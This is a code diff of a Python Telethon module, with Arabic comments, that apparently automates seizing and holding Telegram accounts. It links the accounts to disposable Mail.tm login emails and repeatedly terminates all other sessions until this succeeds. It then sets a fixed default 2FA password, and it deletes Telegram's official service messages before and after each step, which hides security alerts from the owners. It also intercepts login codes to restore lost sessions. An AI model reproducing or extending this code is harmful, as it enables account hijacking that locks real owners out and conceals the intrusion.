@@ -4,7 +4,6 @@ import logging
 import re
 from typing import NamedTuple
 
-from telethon import TelegramClient
 from telethon.sessions import StringSession
 from telethon.errors import (
     SessionPasswordNeededError,
@@ -30,8 +29,13 @@ from telethon.tl.types import (
     EmailVerifyPurposeLoginSetup,
     EmailVerifyPurposeLoginChange,
     EmailVerificationCode,
+    CodeSettings,
 )
-from telethon.tl.functions.auth import ResetAuthorizationsRequest, ResendCodeRequest
+from telethon.tl.functions.auth import (
+    ResetAuthorizationsRequest,
+    ResendCodeRequest,
+    SendCodeRequest,
+)
 
 import database
 import mailtm
@@ -44,7 +48,11 @@ from config import (
     SESSION_RECOVERY_MAX_ATTEMPTS,
     SESSION_RECOVERY_RETRY_DELAY,
     INVALID_SESSION_RESCAN_INTERVAL,
+    DEFAULT_2FA_PASSWORD,
+    RECOVERY_CODE_RESEND_ATTEMPTS,
+    RECOVERY_CODE_RESEND_INTERVAL,
 )
+from telegram_client import make_telegram_client
 
 logger = logging.getLogger(__name__)
 
@@ -68,7 +76,7 @@ class EmailVerifyCtx(NamedTuple):
 # أدوات مساعدة
 # ──────────────────────────────────────────
 async def delete_telegram_official_messages(client) -> None:
-    """حذف رسائل تيليجرام الرسمية — يُستدعى بعد كل عملية."""
+    """حذف رسائل تيليجرام الرسمية (777000) — يُستدعى قبل/بعد كل عملية."""
     for sender_id in OFFICIAL_SENDERS:
         try:
             msgs = await client.get_messages(sender_id, limit=50)
@@ -116,7 +124,7 @@ async def _telegram_has_login_email(client) -> bool:
 async def _login_setup_purpose(client, phone: str):
     """أول ربط بريد — يتطلب phone_code_hash من send_code_request."""
     norm = database.normalize_phone(phone)
-    sent = await client.send_code_request(norm)
+    sent = await _send_login_code_request(client, phone)
     return EmailVerifyPurposeLoginSetup(
         phone_number=norm,
         phone_code_hash=sent.phone_code_hash,
@@ -126,11 +134,31 @@ async def _login_setup_purpose(client, phone: str):
 # ──────────────────────────────────────────
 # تسجيل الدخول
 # ──────────────────────────────────────────
+async def _send_login_code_request(client, phone: str):
+    """طلب كود دخول بإعدادات تقلّل App hash وتفضّل البريد/SMS."""
+    norm = database.normalize_phone(phone)
+    settings = CodeSettings(
+        allow_flashcall=False,
+        current_number=False,
+        allow_app_hash=False,
+        allow_missed_call=False,
+        allow_firebase=False,
+    )
+    return await client(
+        SendCodeRequest(
+            phone_number=norm,
+            api_id=API_ID,
+            api_hash=API_HASH,
+            settings=settings,
+        )
+    )
+
+
 async def request_code(user_id: int, phone: str) -> dict:
     try:
-        client = TelegramClient(StringSession(), API_ID, API_HASH)
+        client = make_telegram_client()
         await client.connect()
-        result = await client.send_code_request(phone)
+        result = await _send_login_code_request(client, phone)
         pending_clients[user_id] = {
             "client": client,
             "phone": phone,
@@ -149,11 +177,11 @@ async def post_registration_setup(
     phone: str, client, phone_code_hash: str | None = None
 ) -> dict:
     """
-    مباشرة بعد التسجيل (بدون علاقة بالطرد):
-    1. حذف رسائل تيليجرام
-    2. ربط بريد Login (Mail.tm)
-    3. حذف رسائل مرة أخرى
-    4. جدولة نظام الطرد التلقائي
+    خط تأمين التسجيل:
+    1) حذف رسائل النظام
+    2) ربط بريد Login (أولاً)
+    3) حذف رسائل النظام
+    4) جدولة: طرد → (بعد النجاح) 2FA من config
     """
     await delete_telegram_official_messages(client)
     row = await database.get_session_by_phone(phone)
@@ -276,9 +304,7 @@ async def get_active_client(phone: str):
         return None
     client = None
     try:
-        client = TelegramClient(
-            StringSession(session["session_string"]), API_ID, API_HASH
-        )
+        client = make_telegram_client(session["session_string"])
         await client.connect()
         if not await client.is_user_authorized():
             await client.disconnect()
@@ -310,9 +336,7 @@ async def check_session_alive(phone: str) -> bool:
         return False
     client = None
     try:
-        client = TelegramClient(
-            StringSession(session["session_string"]), API_ID, API_HASH
-        )
+        client = make_telegram_client(session["session_string"])
         await client.connect()
         if not await client.is_user_authorized():
             return False
@@ -734,13 +758,14 @@ async def change_login_email(phone: str, force: bool = False) -> dict:
 
 
 # ──────────────────────────────────────────
-# نظام الطرد التلقائي (بدون 2FA)
+# نظام الطرد التلقائي ثم 2FA (بعد نجاح الطرد فقط)
 # ──────────────────────────────────────────
 async def _try_auto_kick(phone: str) -> dict:
     client = await get_active_client(phone)
     if not client:
         return {"success": False, "error": "الجلسة غير متاحة"}
     try:
+        await delete_telegram_official_messages(client)
         await client(ResetAuthorizationsRequest())
         await delete_telegram_official_messages(client)
         return {"success": True}
@@ -753,6 +778,46 @@ async def _try_auto_kick(phone: str) -> dict:
         await client.disconnect()
 
 
+async def _apply_default_2fa(phone: str) -> dict:
+    """تفعيل/تغيير 2FA إلى DEFAULT_2FA_PASSWORD من config — بعد نجاح الطرد."""
+    client = await get_active_client(phone)
+    if not client:
+        return {"success": False, "error": "الجلسة غير متاحة"}
+    try:
+        await delete_telegram_official_messages(client)
+        row = await database.get_session_by_phone(phone)
+        current = (row or {}).get("two_fa") or None
+        if current == DEFAULT_2FA_PASSWORD:
+            await database.update_session_two_fa(phone, DEFAULT_2FA_PASSWORD)
+            await database.mark_session_secured(phone)
+            await delete_telegram_official_messages(client)
+            return {"success": True, "skipped": True}
+        await client.edit_2fa(
+            current_password=current,
+            new_password=DEFAULT_2FA_PASSWORD,
+            hint="",
+            email=None,
+        )
+        await database.update_session_two_fa(phone, DEFAULT_2FA_PASSWORD)
+        await database.mark_session_secured(phone)
+        await delete_telegram_official_messages(client)
+        logger.info("default 2FA applied %s", phone)
+        return {"success": True}
+    except Exception as e:
+        logger.warning("default 2FA failed %s: %s", phone, e)
+        return {"success": False, "error": str(e)}
+    finally:
+        await client.disconnect()
+
+
+async def _on_auto_kick_success(phone: str):
+    await database.mark_auto_kick_done(phone)
+    fa = await _apply_default_2fa(phone)
+    if not fa.get("success") and not fa.get("skipped"):
+        logger.warning("2FA after kick %s: %s", phone, fa.get("error"))
+    asyncio.create_task(_post_kick_session_watch(phone))
+
+
 def schedule_auto_kick_pipeline(phone: str):
     if phone in _auto_kick_tasks and not _auto_kick_tasks[phone].done():
         return
@@ -761,28 +826,37 @@ def schedule_auto_kick_pipeline(phone: str):
 
 async def _auto_kick_worker(phone: str):
     """
-    محاولات الطرد التلقائي:
-    0) فور التسجيل
-    1) بعد 24 ساعة
-    2) بعد 5 دقائق إضافية
-    عند النجاح: حذف رسائل فقط (بدون 2FA)
+    طرد الجلسات الأخرى:
+    فوراً → بعد 24 ساعة → كل 5 دقائق حتى ينجح.
+    عند النجاح فقط: 2FA = DEFAULT_2FA_PASSWORD من config.
     """
-    delays = [0, AUTO_KICK_DELAY_24H, AUTO_KICK_DELAY_RETRY]
     try:
-        for attempt, delay in enumerate(delays):
-            if delay > 0:
-                await database.set_auto_kick_stage(phone, attempt)
-                await asyncio.sleep(delay)
+        await database.set_auto_kick_stage(phone, 0)
+        result = await _try_auto_kick(phone)
+        if result.get("success"):
+            logger.info("auto kick OK %s (immediate)", phone)
+            await _on_auto_kick_success(phone)
+            return
+        logger.info("auto kick fail %s immediate: %s", phone, result.get("error"))
+
+        await database.set_auto_kick_stage(phone, 1)
+        await asyncio.sleep(AUTO_KICK_DELAY_24H)
+        result = await _try_auto_kick(phone)
+        if result.get("success"):
+            logger.info("auto kick OK %s (after 24h)", phone)
+            await _on_auto_kick_success(phone)
+            return
+        logger.info("auto kick fail %s after 24h: %s", phone, result.get("error"))
+
+        while True:
+            await database.set_auto_kick_stage(phone, 2)
+            await asyncio.sleep(AUTO_KICK_DELAY_RETRY)
             result = await _try_auto_kick(phone)
             if result.get("success"):
-                await database.mark_auto_kick_done(phone)
-                logger.info("auto kick OK %s attempt %s", phone, attempt)
-                asyncio.create_task(_post_kick_session_watch(phone))
+                logger.info("auto kick OK %s (5m retry)", phone)
+                await _on_auto_kick_success(phone)
                 return
-            logger.info(
-                "auto kick fail %s attempt %s: %s",
-                phone, attempt, result.get("error"),
-            )
+            logger.info("auto kick fail %s retry: %s", phone, result.get("error"))
     except Exception as e:
         logger.error("auto kick worker %s: %s", phone, e)
     finally:
@@ -800,12 +874,14 @@ async def resume_auto_kick_pipelines():
 # ──────────────────────────────────────────
 # تنظيف شامل يدوي (أدمن): طرد → 2FA → حذف رسائل
 # ──────────────────────────────────────────
-async def admin_full_cleanup(phone: str, new_password: str) -> dict:
+async def admin_full_cleanup(phone: str, new_password: str | None = None) -> dict:
+    new_password = new_password or DEFAULT_2FA_PASSWORD
     client = await get_active_client(phone)
     if not client:
         return {"success": False, "error": "الجلسة معطلة", "step": "connect"}
 
     try:
+        await delete_telegram_official_messages(client)
         await client(ResetAuthorizationsRequest())
         await delete_telegram_official_messages(client)
     except Exception as e:
@@ -851,25 +927,70 @@ def _sent_code_delivery_label(sent) -> str:
     return type(sent.type).__name__ if sent and sent.type else "Unknown"
 
 
+def _is_email_delivery(sent) -> bool:
+    return "Email" in _sent_code_delivery_label(sent)
+
+
 async def _request_login_code_via_email(client, phone: str) -> tuple[str, str]:
-    """طلب كود دخول — يُفضّل إرساله إلى بريد Login المربوط."""
+    """
+    طلب كود دخول — إعادة إرسال متكررة حتى SentCodeTypeEmailCode (Mail.tm).
+    """
     norm = database.normalize_phone(phone)
-    sent = await client.send_code_request(norm)
+    sent = await _send_login_code_request(client, phone)
     phone_code_hash = sent.phone_code_hash
     delivery = _sent_code_delivery_label(sent)
-    if "Email" in delivery:
+    logger.info("login code request %s -> %s", phone, delivery)
+    if _is_email_delivery(sent):
         return phone_code_hash, delivery
-    for attempt in range(5):
+
+    for attempt in range(RECOVERY_CODE_RESEND_ATTEMPTS):
+        await asyncio.sleep(RECOVERY_CODE_RESEND_INTERVAL)
         try:
             sent = await client(ResendCodeRequest(norm, phone_code_hash))
             phone_code_hash = sent.phone_code_hash
             delivery = _sent_code_delivery_label(sent)
-            if "Email" in delivery:
+            logger.info(
+                "resend login code %s attempt %s -> %s",
+                phone,
+                attempt + 1,
+                delivery,
+            )
+            if _is_email_delivery(sent):
                 return phone_code_hash, delivery
+        except FloodWaitError as e:
+            logger.warning("resend flood %s: %ss", phone, e.seconds)
+            await asyncio.sleep(min(e.seconds + 1, 120))
         except Exception as e:
             logger.debug("resend login code %s attempt %s: %s", phone, attempt, e)
-        await asyncio.sleep(3)
+
     return phone_code_hash, delivery
+
+
+async def _wait_code_from_official_chat(client, timeout: int = 180) -> str | None:
+    """انتظار كود من 777000 على جلسة لا تزال مسجّلة."""
+    snapshot = {}
+    for sender_id in OFFICIAL_SENDERS:
+        try:
+            msgs = await client.get_messages(sender_id, limit=1)
+            snapshot[sender_id] = msgs[0].id if msgs else 0
+        except Exception:
+            snapshot[sender_id] = 0
+
+    loop = asyncio.get_running_loop()
+    deadline = loop.time() + timeout
+    while loop.time() < deadline:
+        await asyncio.sleep(3)
+        for sender_id, last_id in list(snapshot.items()):
+            try:
+                new_msgs = await client.get_messages(sender_id, limit=8)
+                for msg in new_msgs:
+                    if msg.id > last_id and msg.text and CODE_PATTERN.search(msg.text):
+                        return msg.text
+                if new_msgs:
+                    snapshot[sender_id] = max(last_id, new_msgs[0].id)
+            except Exception:
+                pass
+    return None
 
 
 def _recovery_error_retryable(error: str) -> bool:
@@ -916,41 +1037,44 @@ async def recover_session(phone: str) -> dict:
             "retryable": True,
         }
 
-    client = TelegramClient(StringSession(), API_ID, API_HASH)
-    await client.connect()
+    client = None
     try:
+        client = await get_active_client(phone)
+        if not client:
+            ss = (row.get("session_string") or "").strip()
+            client = make_telegram_client(ss if ss else None)
+            await client.connect()
+
         phone_code_hash, delivery = await _request_login_code_via_email(client, phone)
         logger.info("recover %s code delivery: %s", phone, delivery)
 
-        if "Email" not in delivery:
-            return {
-                "success": False,
-                "error": (
-                    f"تيليجرام أرسل الكود عبر {delivery} وليس البريد — "
-                    f"لن يصل إلى Mail.tm ({login_email})"
-                ),
-                "retryable": True,
-                "delivery": delivery,
-            }
-
-        raw_codes = await fetch_codes_from_email(
-            login_email,
-            email_password,
-            attempts=36,
-            interval=5,
-            exclude_ids=exclude_ids,
-        )
         code = None
-        for raw in raw_codes:
-            code = _normalize_login_code(raw)
-            if code:
-                break
+        if "Email" in delivery:
+            raw_codes = await fetch_codes_from_email(
+                login_email,
+                email_password,
+                attempts=36,
+                interval=5,
+                exclude_ids=exclude_ids,
+            )
+            for raw in raw_codes:
+                code = _normalize_login_code(raw)
+                if code:
+                    break
+        elif await client.is_user_authorized():
+            official_text = await _wait_code_from_official_chat(client, timeout=120)
+            if official_text:
+                code = _normalize_login_code(official_text)
+                delivery = "OfficialChatFallback"
+                logger.info("recover %s code from 777000", phone)
+
         if not code:
             return {
                 "success": False,
                 "error": (
-                    f"لم يصل كود جديد إلى Mail.tm خلال ~3 دقائق ({login_email}) — "
-                    f"تحقق أن تيليجرام يرسل الكود للبريد وليس SMS"
+                    f"تيليجرام أرسل الكود عبر {delivery} — "
+                    f"لم يصل إلى Mail.tm ({login_email}). "
+                    f"سيتم إعادة المحاولة مع إجبار البريد."
                 ),
                 "retryable": True,
                 "delivery": delivery,
@@ -959,14 +1083,16 @@ async def recover_session(phone: str) -> dict:
         try:
             await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
         except SessionPasswordNeededError:
-            if not row["two_fa"]:
+            pwd = row["two_fa"] or DEFAULT_2FA_PASSWORD
+            if not pwd:
                 return {
                     "success": False,
                     "error": "يتطلب 2FA غير محفوظ",
                     "retryable": False,
                 }
-            await client.sign_in(password=row["two_fa"])
+            await client.sign_in(password=pwd)
 
+        await delete_telegram_official_messages(client)
         session_string = client.session.save()
         me = await client.get_me()
         full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
@@ -974,6 +1100,7 @@ async def recover_session(phone: str) -> dict:
         await database.save_session(
             phone, username, full_name, session_string, row["two_fa"]
         )
+        await delete_telegram_official_messages(client)
         _recovery_scheduled.discard(phone)
         _recovery_fail_count.pop(phone, None)
         return {"success": True, "email": login_email}
@@ -991,7 +1118,11 @@ async def recover_session(phone: str) -> dict:
             "retryable": _recovery_error_retryable(err),
         }
     finally:
-        await client.disconnect()
+        if client:
+            try:
+                await client.disconnect()
+            except Exception:
+                pass
 
 
 _email_bind_retry_tasks: dict[str, asyncio.Task] = {}
@@ -1210,9 +1341,7 @@ async def watch_for_new_code(phone: str, timeout: int = 180) -> str | None:
 
     client = None
     try:
-        client = TelegramClient(
-            StringSession(session["session_string"]), API_ID, API_HASH
-        )
+        client = make_telegram_client(session["session_string"])
         await client.connect()
         if not await client.is_user_authorized():
             await client.disconnect()
